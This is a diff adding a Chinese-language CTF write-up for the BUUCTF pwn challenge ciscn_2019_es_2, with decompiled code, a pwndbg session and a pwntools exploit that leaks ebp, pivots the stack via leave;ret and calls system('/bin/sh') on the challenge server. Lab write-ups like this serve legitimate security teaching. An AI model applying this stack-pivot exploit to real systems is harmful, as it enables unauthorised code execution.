@@ -2872,6 +2872,258 @@ io.interactive()
 
 ------
 
+### [ciscn_2019_es_2](https://buuoj.cn/challenges#ciscn_2019_es_2)
+
+先`file ./ciscn_2019_es_2`查看文件类型再`checksec --file=./ciscn_2019_es_2`检查文件保护情况。
+
+```bash
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
+└─$ file ./ciscn_2019_es_2
+./ciscn_2019_es_2: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=88938f6e63cc4e27018f9032c4934e0a377712d1, not stripped
+                                                                                                      
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
+└─$ checksec --file=./ciscn_2019_es_2
+[*] '/home/tyd/ctf/pwn/buuctf/ciscn_2019_es_2'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+```
+
+用`IDA Pro 32bit`打开附件`ciscn_2019_es_2`，按`F5`反汇编源码并查看主函数。
+
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  init();
+  puts("Welcome, my friend. What's your name?");
+  vul();
+  return 0;
+}
+```
+
+双击`vul()`函数查看详情，`char`型变量`s`的大小是`0x28`个字节，`read()`函数能够读取`0x40`个字节，存在栈溢出漏洞，但是只溢出了`8`个字节，这只能覆盖`$ebp`和`ret`，这题的考察点应该是栈迁移。
+
+```c
+int vul()
+{
+  char s[40]; // [esp+0h] [ebp-28h] BYREF
+
+  memset(s, 0, 0x20u);
+  read(0, s, 0x30u);
+  printf("Hello, %s\n", s);
+  read(0, s, 0x30u);
+  return printf("Hello, %s\n", s);
+}
+```
+
+栈迁移的大致过程如下：
+
+![](https://paper.tanyaodan.com/BUUCTF/ciscn_2019_es_2/1.jpg)
+
+`vul()`函数提供了俩次输入输出，我们第一次输入输出可以用来泄露`$ebp`的地址，设置栈布局，第二次输入覆盖`$ebp`和`ret`进行栈迁移，再回到栈顶执行`ROP`链。
+
+![](https://paper.tanyaodan.com/BUUCTF/ciscn_2019_es_2/2.jpg)
+
+`read()`函数执行完后，`leave; ret;`时会执行`move esp, ebp; pop ebp;`，此时`$ebp`指向的是`fake_ebp_addr`。然后又会执行一次`leave; ret;`，此时会执行我们构造的`ROP`链。
+
+![](https://paper.tanyaodan.com/BUUCTF/ciscn_2019_es_2/3.jpg)
+
+在`Functions window`中发现后门函数`hack()`能够输出`flag`，`echo flag`能输出`flag`这四个字符，而不是我们想要的`flag`文件中的内容。这里相当于提供了一个`system`函数。
+
+```c
+int hack()
+{
+  return system("echo flag");
+}
+```
+
+`gdb`进一步了解程序的部分过程如下：
+
+```assembly
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
+└─$ gdb ./ciscn_2019_es_2
+pwndbg> disassemble vul
+Dump of assembler code for function vul:
+   0x08048595 <+0>:     push   ebp
+   0x08048596 <+1>:     mov    ebp,esp
+   0x08048598 <+3>:     sub    esp,0x28
+   0x0804859b <+6>:     sub    esp,0x4
+   0x0804859e <+9>:     push   0x20
+   0x080485a0 <+11>:    push   0x0
+   0x080485a2 <+13>:    lea    eax,[ebp-0x28]
+   0x080485a5 <+16>:    push   eax
+   0x080485a6 <+17>:    call   0x8048430 <memset@plt>
+   0x080485ab <+22>:    add    esp,0x10
+   0x080485ae <+25>:    sub    esp,0x4
+   0x080485b1 <+28>:    push   0x30
+   0x080485b3 <+30>:    lea    eax,[ebp-0x28]
+   0x080485b6 <+33>:    push   eax
+   0x080485b7 <+34>:    push   0x0
+   0x080485b9 <+36>:    call   0x80483d0 <read@plt>
+   0x080485be <+41>:    add    esp,0x10
+   0x080485c1 <+44>:    sub    esp,0x8
+   0x080485c4 <+47>:    lea    eax,[ebp-0x28]
+   0x080485c7 <+50>:    push   eax
+   0x080485c8 <+51>:    push   0x80486ca
+   0x080485cd <+56>:    call   0x80483e0 <printf@plt>
+   0x080485d2 <+61>:    add    esp,0x10
+   0x080485d5 <+64>:    sub    esp,0x4
+   0x080485d8 <+67>:    push   0x30
+   0x080485da <+69>:    lea    eax,[ebp-0x28]
+   0x080485dd <+72>:    push   eax
+   0x080485de <+73>:    push   0x0
+   0x080485e0 <+75>:    call   0x80483d0 <read@plt>
+   0x080485e5 <+80>:    add    esp,0x10
+   0x080485e8 <+83>:    sub    esp,0x8
+   0x080485eb <+86>:    lea    eax,[ebp-0x28]
+   0x080485ee <+89>:    push   eax
+   0x080485ef <+90>:    push   0x80486ca
+   0x080485f4 <+95>:    call   0x80483e0 <printf@plt>
+   0x080485f9 <+100>:   add    esp,0x10
+   0x080485fc <+103>:   nop
+   0x080485fd <+104>:   leave  # 等价 mov esp, ebp; pop ebp; (esp = esp+4)
+   0x080485fe <+105>:   ret    # 等价 pop eip
+End of assembler dump.
+pwndbg> b *vul+36
+Breakpoint 1 at 0x80485b9
+pwndbg> run
+Starting program: /home/tyd/ctf/pwn/buuctf/ciscn_2019_es_2 
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+Welcome, my friend. What's your name?
+
+Breakpoint 1, 0x080485b9 in vul ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────
+ EAX  0xffffcfa0 ◂— 0x0
+ EBX  0xf7e1cff4 (_GLOBAL_OFFSET_TABLE_) ◂— 0x21cd8c
+ ECX  0x20
+ EDX  0xffffcfc0 —▸ 0x80486d8 ◂— push   edi /* "Welcome, my friend. What's your name?" */
+ EDI  0xf7ffcb80 (_rtld_global_ro) ◂— 0x0
+ ESI  0x8048640 (__libc_csu_init) ◂— push   ebp
+ EBP  0xffffcfc8 —▸ 0xffffcfd8 ◂— 0x0
+ ESP  0xffffcf90 ◂— 0x0
+ EIP  0x80485b9 (vul+36) —▸ 0xfffe12e8 ◂— 0x0
+──────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────
+ ► 0x80485b9 <vul+36>    call   read@plt                     <read@plt>
+        fd: 0x0 (/dev/pts/0)
+        buf: 0xffffcfa0 ◂— 0x0
+        nbytes: 0x30
+ 
+   0x80485be <vul+41>    add    esp, 0x10
+   0x80485c1 <vul+44>    sub    esp, 8
+   0x80485c4 <vul+47>    lea    eax, [ebp - 0x28]
+   0x80485c7 <vul+50>    push   eax
+   0x80485c8 <vul+51>    push   0x80486ca
+   0x80485cd <vul+56>    call   printf@plt                     <printf@plt>
+ 
+   0x80485d2 <vul+61>    add    esp, 0x10
+   0x80485d5 <vul+64>    sub    esp, 4
+   0x80485d8 <vul+67>    push   0x30
+   0x80485da <vul+69>    lea    eax, [ebp - 0x28]
+──────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────
+00:0000│ esp 0xffffcf90 ◂— 0x0
+01:0004│     0xffffcf94 —▸ 0xffffcfa0 ◂— 0x0
+02:0008│     0xffffcf98 ◂— 0x30 /* '0' */
+03:000c│     0xffffcf9c ◂— 0x25 /* '%' */
+04:0010│ eax 0xffffcfa0 ◂— 0x0
+... ↓        3 skipped
+────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────
+ ► f 0 0x80485b9 vul+36
+   f 1 0x804862a main+43
+   f 2 0xf7c23295 __libc_start_call_main+117
+   f 3 0xf7c23358 __libc_start_main+136
+   f 4 0x8048471 _start+33
+──────────────────────────────────────────────────────────────────────────────────────────────────────
+pwndbg> n
+AAAA
+0x080485be in vul ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────
+*EAX  0x5
+ EBX  0xf7e1cff4 (_GLOBAL_OFFSET_TABLE_) ◂— 0x21cd8c
+*ECX  0xffffcfa0 ◂— 'AAAA\n'
+*EDX  0x30
+ EDI  0xf7ffcb80 (_rtld_global_ro) ◂— 0x0
+ ESI  0x8048640 (__libc_csu_init) ◂— push   ebp
+ EBP  0xffffcfc8 —▸ 0xffffcfd8 ◂— 0x0
+ ESP  0xffffcf90 ◂— 0x0
+*EIP  0x80485be (vul+41) ◂— add    esp, 0x10
+──────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────
+   0x80485b9 <vul+36>    call   read@plt                     <read@plt>
+ 
+ ► 0x80485be <vul+41>    add    esp, 0x10
+   0x80485c1 <vul+44>    sub    esp, 8
+   0x80485c4 <vul+47>    lea    eax, [ebp - 0x28]
+   0x80485c7 <vul+50>    push   eax
+   0x80485c8 <vul+51>    push   0x80486ca
+   0x80485cd <vul+56>    call   printf@plt                     <printf@plt>
+ 
+   0x80485d2 <vul+61>    add    esp, 0x10
+   0x80485d5 <vul+64>    sub    esp, 4
+   0x80485d8 <vul+67>    push   0x30
+   0x80485da <vul+69>    lea    eax, [ebp - 0x28]
+──────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────
+00:0000│ esp 0xffffcf90 ◂— 0x0
+01:0004│     0xffffcf94 —▸ 0xffffcfa0 ◂— 'AAAA\n'
+02:0008│     0xffffcf98 ◂— 0x30 /* '0' */
+03:000c│     0xffffcf9c ◂— 0x25 /* '%' */
+04:0010│ ecx 0xffffcfa0 ◂— 'AAAA\n'
+05:0014│     0xffffcfa4 ◂— 0xa /* '\n' */
+06:0018│     0xffffcfa8 ◂— 0x0
+07:001c│     0xffffcfac ◂— 0x0
+────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────
+ ► f 0 0x80485be vul+41
+   f 1 0x804862a main+43
+   f 2 0xf7c23295 __libc_start_call_main+117
+   f 3 0xf7c23358 __libc_start_main+136
+   f 4 0x8048471 _start+33
+──────────────────────────────────────────────────────────────────────────────────────────────────────
+pwndbg> stack 0x10
+00:0000│ esp 0xffffcf90 ◂— 0x0
+01:0004│     0xffffcf94 —▸ 0xffffcfa0 ◂— 'AAAA\n'
+02:0008│     0xffffcf98 ◂— 0x30 /* '0' */
+03:000c│     0xffffcf9c ◂— 0x25 /* '%' */
+04:0010│ ecx 0xffffcfa0 ◂— 'AAAA\n'     
+05:0014│     0xffffcfa4 ◂— 0xa /* '\n' */
+06:0018│     0xffffcfa8 ◂— 0x0
+... ↓        5 skipped
+0c:0030│     0xffffcfc0 —▸ 0x80486d8 ◂— push   edi /* "Welcome, my friend. What's your name?" */
+0d:0034│     0xffffcfc4 —▸ 0xf7fc1678 —▸ 0xf7ffdbac —▸ 0xf7fc1790 —▸ 0xf7ffda40 ◂— ...
+0e:0038│ ebp 0xffffcfc8 —▸ 0xffffcfd8 ◂— 0x0   # $ebp起始地址
+0f:003c│     0xffffcfcc —▸ 0x804862a (main+43) ◂— mov    eax, 0
+```
+
+编写`Python`代码求解，拿到`shell`后`cat flag`，得到`flag{bd018c2d-7070-4625-a5d0-4cd000f2f625}`。
+
+```python
+from pwn import *
+
+# io = process('./ciscn_2019_es_2')
+io = remote('node4.buuoj.cn', 25169)
+padding = cyclic(0x27)
+io.recvuntil(b"Welcome, my friend. What's your name?\n")
+io.sendline(padding)
+io.recvline()
+ebp = u32(io.recv(4))  # raw ebp
+log.info('ebp_addr => %#x', ebp)
+# gdb.attach(io)
+leave_ret = 0x80485fd  # leave; ret; 这俩个都行
+leave_ret = 0x80484b8  # ROPgadget --binary ./ciscn_2019_es_2 --only "leave|ret"
+elf = ELF('./ciscn_2019_es_2')
+system_addr = elf.symbols['system']  # 0x8048400
+stdin_addr = ebp-0x38
+payload = p32(ebp)
+payload += p32(system_addr) + p32(0) + p32(stdin_addr+0x10) + b'/bin/sh\x00'
+payload += cyclic(0x10) + p32(stdin_addr) + p32(leave_ret)
+io.sendline(payload)
+io.interactive()
+```
+
+------
+
 ### [jarvisoj_level4](https://buuoj.cn/challenges#jarvisoj_level4)
 
 先`file ./level4`查看文件类型，再`checksec --file=./level4`检查文件保护情况。
@@ -12808,7 +13060,7 @@ Dump of assembler code for function main:
    0x08049413 <+262>:   mov    DWORD PTR [esp],0x80da6ba
    0x0804941a <+269>:   call   0x805c2d0 <puts>
    0x0804941f <+274>:   mov    eax,0x0
-   0x08049424 <+279>:   leave  # 等价 mov esp, ebp; pop ebp
+   0x08049424 <+279>:   leave  # 等价 mov esp, ebp; pop ebp; (esp = esp+4)
    0x08049425 <+280>:   ret    # 等价 pop eip
 End of assembler dump.
 pwndbg> disassemble auth
@@ -12841,7 +13093,7 @@ Dump of assembler code for function auth:
    0x080492ff <+99>:    mov    eax,0x1
    0x08049304 <+104>:   jmp    0x804930b <auth+111>
    0x08049306 <+106>:   mov    eax,0x0
-   0x0804930b <+111>:   leave  # 等价 mov esp, ebp; pop ebp
+   0x0804930b <+111>:   leave  # 等价 mov esp, ebp; pop ebp; (esp = esp+4)
    0x0804930c <+112>:   ret    # 等价 pop eip    
 End of assembler dump.
 pwndbg> disassemble correct
